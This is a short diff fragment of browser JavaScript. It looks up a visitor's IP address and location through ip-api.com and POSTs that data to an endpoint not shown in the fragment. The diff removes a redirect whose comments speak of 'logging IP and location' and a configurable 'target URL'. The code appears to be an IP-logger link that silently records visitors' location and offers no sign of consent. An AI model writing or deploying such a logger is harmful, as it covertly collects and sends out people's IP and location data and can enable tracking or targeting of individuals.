@@ -11,8 +11,5 @@ fetch("http://ip-api.com/json/")
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(message)
-  }).then(() => {
-    // Redirect after logging IP and location
-    window.location.href = "https://example.com"; // Change this to your target URL
-  });
+  })
 });
